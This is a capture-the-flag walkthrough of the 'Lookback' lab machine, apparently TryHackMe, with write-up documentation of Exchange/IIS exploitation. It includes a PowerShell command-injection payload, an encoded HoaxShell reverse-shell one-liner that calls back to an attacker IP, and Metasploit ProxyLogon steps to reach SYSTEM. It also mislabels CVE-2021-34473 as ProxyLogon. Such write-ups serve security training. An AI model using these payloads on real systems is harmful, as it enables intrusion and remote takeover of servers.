# Lookback

## Machine Information



## Ports Scan

```bash
nmap -T4 -A -p- --min-rate 1000 10.10.67.15 -oN port_scan.txt

Nmap scan report for 10.10.67.15
Host is up (0.036s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title.
443/tcp  open  ssl/https
| ssl-cert: Subject: commonName=WIN-12OUO7A66M7
| Subject Alternative Name: DNS:WIN-12OUO7A66M7, DNS:WIN-12OUO7A66M7.thm.local
| Not valid before: 2023-01-25T21:34:02
|_Not valid after:  2028-01-25T21:34:02
|_http-server-header: Microsoft-IIS/10.0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WIN-12OUO7A66M7.thm.local
| Not valid before: 2025-07-31T13:11:42
|_Not valid after:  2026-01-30T13:11:42
| rdp-ntlm-info: 
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: WIN-12OUO7A66M7
|   DNS_Domain_Name: thm.local
|   DNS_Computer_Name: WIN-12OUO7A66M7.thm.local
|   DNS_Tree_Name: thm.local
|   Product_Version: 10.0.17763
|_  System_Time: 2025-08-01T13:20:43+00:00
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019
Aggressive OS guesses: Windows Server 2019 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```



## Web Enum

There are 2 page.

The port 443 running Outlook web login. The server might be a Microsoft Exchange Server.

<figure><img src="../../../.gitbook/assets/image (347).png" alt=""><figcaption></figcaption></figure>

The port 80 running a empty page. But running a fuzzing we found these pages:

{% code overflow="wrap" %}
```bash
gobuster dir -u http://10.10.67.15/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt --exclude-length 0

/test                 (Status: 403) [Size: 1233]
/Test                 (Status: 403) [Size: 1233]
/ecp                  (Status: 302) [Size: 205] [--> https://10.10.67.15/owa/auth/logon.aspx?url=https%3a%2f%2f10.10.67.15%2fecp&reason=0]
```
{% endcode %}

&#x20;Adding the hostname found in the nmap scan to the /etc/hosts file

```bash
echo "10.10.67.15    win-12ouo7a66m7.thm.local    thm.local" > /etc/hosts
```

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Try to insert the default credentials `admin:admin` and it's worked.&#x20;

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



Try to run the command with empty and this error appairs

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Probably we can find the escape input to do a Command Injection.

{% code title="Payload" overflow="wrap" %}
```powershell
xlog=BitlockerActiveMonitoringLogs');whoami;Get-Content('C:\BitlockerActiveMonitoringLogs
```
{% endcode %}

### Reverse Shell with Command Injection

Running this payload we can establish a reverse shell with HoaxShell.

{% code title="Gen Payload and Start listener in attack machine" %}
```bash
hoaxshell -s 10.23.52.142 -p 9009 -i -H "Authorization"
```
{% endcode %}

{% code title="Payload" overflow="wrap" %}
```powershell
xlog=BitlockerActiveMonitoringLogs');powershell -e JABzAD0AJwAxADAALgAyADMALgA1ADIALgAxADQAMgA6ADkAMAAwADkAJwA7ACQAaQA9ACcAYQA3ADAAMABhAGYAYwA5AC0ANgBjADgAOQA5AGIAZQA4AC0AMwA5AGIAZAA1ADYANgA4ACcAOwAkAHAAPQAnAGgAdAB0AHAAOgAvAC8AJwA7ACQAdgA9AEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAAtAFUAcgBpACAAJABwACQAcwAvAGEANwAwADAAYQBmAGMAOQAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAEEAdQB0AGgAbwByAGkAegBhAHQAaQBvAG4AIgA9ACQAaQB9ADsAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQB7ACQAYwA9ACgASQBuAHYAbwBrAGUALQBSAGUAcwB0AE0AZQB0AGgAbwBkACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8ANgBjADgAOQA5AGIAZQA4ACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAQQB1AHQAaABvAHIAaQB6AGEAdABpAG8AbgAiAD0AJABpAH0AKQA7AGkAZgAgACgAJABjACAALQBuAGUAIAAnAE4AbwBuAGUAJwApACAAewAkAHIAPQBpAGUAeAAgACQAYwAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwB0AG8AcAAgAC0ARQByAHIAbwByAFYAYQByAGkAYQBiAGwAZQAgAGUAOwAkAHIAPQBPAHUAdAAtAFMAdAByAGkAbgBnACAALQBJAG4AcAB1AHQATwBiAGoAZQBjAHQAIAAkAHIAOwAkAHQAPQBJAG4AdgBvAGsAZQAtAFIAZQBzAHQATQBlAHQAaABvAGQAIAAtAFUAcgBpACAAJABwACQAcwAvADMAOQBiAGQANQA2ADYAOAAgAC0ATQBlAHQAaABvAGQAIABQAE8AUwBUACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAQQB1AHQAaABvAHIAaQB6AGEAdABpAG8AbgAiAD0AJABpAH0AIAAtAEIAbwBkAHkAIAAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAkAGUAKwAkAHIAKQAgAC0AagBvAGkAbgAgACcAIAAnACkAfQAgAHMAbABlAGUAcAAgADAALgA4AH0A;Get-Content('C:
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now we can print the user flag.

```powershell
more C:\Users\dev\Desktop\user.txt
```



## Privilege Escalation

We found a TODO.txt file in the dev's Desktop

<figure><img src="../../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

From this we can get that:

* MS Exchange could be vulnerable to some exploit
* LAPS is not enable
* Discovered 3 accounts:

```
joe@thm.local
carol@thm.local
dev-infrastracture-team@thm.local
```



### Microsoft Exchange Outdated - CVE-2021-34473

Get the version of microsoft exchange installed:

{% code overflow="wrap" %}
```powershell
 [System.Diagnostics.FileVersionInfo]::GetVersionInfo("C:\Program Files\Microsoft\Exchange Server\V15\Bin\Microsoft.Exchange.Transport.dll")
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

```
15.02.0858.002
```

As the note said, search for possible vulnerability for this version.&#x20;

In March 2021, a version was released that contains no specific exploit for the vulnerability. However, an RCE vulnerability known as ProxyLogon was discovered in that month.

Using this Nuclei templace we can see if the server is vulnerable to CVE-2021-34473 (ProxyLogon)

{% embed url="https://github.com/kh4sh3i/ProxyShell/blob/main/proxyshell.yaml" %}

```bash
nuclei -u win-12ouo7a66m7.thm.local -t proxyshell.yaml
```

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

This server is vulnerable, now search the exploit in Metasploit.

```bash
sudo service postgresql start && msfconsole
search exchange
```

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

This module can help us.

```bash
use exploit/windows/http/exchange_proxylogon_rce
set RHOSTS 10.10.228.148
set EMAIL dev-infrastracture-team@thm.local
exploit
```

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

In this way we have a meterpreter session as NT AUTHORITY\SYSTEM.

Firstly, print the root flag.

```powershell
more C:\Users\Administrator\Documents\flag.txt
```

The next step could be dump the hash end enumeration all machine finding all necessary element for a futher persistance, pivoting or lateral movement.

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
